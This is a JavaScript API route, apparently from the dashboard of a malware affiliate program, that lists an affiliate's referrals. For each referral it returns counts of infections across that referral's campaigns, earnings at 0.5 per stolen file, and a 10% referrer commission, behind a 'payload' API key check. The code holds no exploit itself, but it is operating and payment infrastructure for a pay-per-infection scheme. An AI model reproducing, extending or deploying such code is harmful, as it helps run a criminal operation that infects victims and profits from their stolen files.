// vercel-dashboard/api/affiliate/referral/list.js
// Affiliate referral list

import { kv } from '../../../lib/kv.js';
import { verifyPayloadApiKey } from '../../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();
  if (request.method !== 'GET') return response.status(405).json({ error: 'Method not allowed' });

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid || auth.role !== 'campaign') {
    return response.status(403).json({ error: 'Affiliate access required' });
  }

  const affiliateId = `aff_${auth.campaignId.replace('camp_', '')}`;
  const { page = 1, limit = 20 } = request.query;

  try {
    const referralIds = await kv.smembers(`affiliate:${affiliateId}:referrals`) || [];
    const referrals = [];

    for (const refId of referralIds) {
      const ref = await kv.get(`affiliate:${refId}`);
      if (ref) {
        // Get ref's stats
        const campaignIds = await kv.smembers(`affiliate:${refId}:campaigns`) || [];
        let infectionCount = 0;
        let totalEarnings = 0;
        
        for (const cid of campaignIds) {
          const stats = await kv.hgetall(`campaign:${cid}:stats`) || {};
          infectionCount += parseInt(stats.totalInfections || '0');
          totalEarnings += parseInt(stats.totalFiles || '0') * 0.5;
        }

        referrals.push({
          id: ref.id,
          username: ref.username,
          email: ref.email,
          joinedAt: ref.createdAt,
          campaignCount: campaignIds.length,
          infectionCount,
          totalEarnings,
          yourCommission: totalEarnings * 0.1,
          status: ref.status,
        });
      }
    }

    referrals.sort((a, b) => new Date(b.joinedAt) - new Date(a.joinedAt));

    const pageNum = parseInt(page);
    const limitNum = parseInt(limit);
    const start = (pageNum - 1) * limitNum;

    return response.json({
      referrals: referrals.slice(start, start + limitNum),
      total: referrals.length,
      page: pageNum,
      pageSize: limitNum,
    });
  } catch (error) {
    console.error('Affiliate referral list error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}